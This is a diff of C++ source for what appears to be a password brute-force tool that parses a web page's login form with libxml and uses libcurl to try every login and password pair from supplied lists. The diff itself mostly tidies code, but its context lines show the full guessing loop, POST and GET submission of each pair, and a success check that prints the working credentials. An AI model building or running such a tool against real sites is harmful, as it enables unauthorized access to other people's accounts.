@@ -186,48 +186,9 @@ static void StartElement(void *voidContext, const xmlChar *name, const xmlChar *
 	}
 }
 
-
-//
-//  libxml end element callback function
-//
-
-static void EndElement(void *voidContext,
-                       const xmlChar *name){
-  Context *context = (Context *)voidContext;
-  /*if (!strcasecmp((char *)name, "form")){
-	  form.containsForm = false;
-  }*/
-}
-
-static htmlSAXHandler saxHandler = {
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  StartElement,
-  EndElement,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL,
-  NULL
-};
+static htmlSAXHandler saxHandler = {NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 
+									NULL, NULL, NULL, NULL,  NULL, StartElement, NULL, NULL, 
+									NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL};
 
 //
 //  Parse given (assumed to be) HTML text and btutforce atack on the page
@@ -266,6 +227,7 @@ static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passw
 	CURLcode code;
 	string respBuffer;
 	char errBuffer[CURL_ERROR_SIZE];
+
 	curl_global_init(CURL_GLOBAL_ALL);
 	curl = curl_easy_init();
 	if(!curl){
@@ -288,7 +250,6 @@ static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passw
 	//Brute force for all combinations of the given logins and passwords
 	for (list<string>::iterator loginIt = logins.begin(); loginIt != logins.end(); ++loginIt){
 		for (list<string>::iterator passwordIt = passwords.begin(); passwordIt != passwords.end(); ++passwordIt){
-
 			if(!strcasecmp((char*)form.formMethod, "post")){
 				curl_easy_setopt(curl, CURLOPT_URL,  action);
 				data = concat(NULL, form.login, *loginIt, form.password, *passwordIt);
@@ -301,7 +262,6 @@ static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passw
 				cout<<*data<<endl;
 				curl_easy_setopt(curl, CURLOPT_URL,  data->c_str());
 			}
-
 			cout<<"perform some attack \n";
 			respBuffer.clear();
 			code = curl_easy_perform(curl);
@@ -311,7 +271,6 @@ static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passw
 				break;
 			}
 			cout<<__LINE__<<endl;
-
 			if (strstr(respBuffer.c_str(), (*loginIt).c_str()) != NULL){
 				cout<<"Congradulation you have logged in\n";
 				cout<<"Login ="<<*loginIt<<" Password ="<<*passwordIt<<endl;
@@ -328,10 +287,8 @@ static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passw
 bool startAttack(string& hostName, list<string> &logins, list<string> &passwords, string &login, string &password){
 	CURL *conn = NULL;
 	CURLcode code;
-
-	//  libcurl variables for error strings and returned data
-	char errorBuffer[CURL_ERROR_SIZE];
 	string buffer;
+	char errorBuffer[CURL_ERROR_SIZE];
 
 	if (!init(conn, (char*)hostName.c_str(), buffer, errorBuffer)){
 		fprintf(stderr, "Connection initializion failed\n");
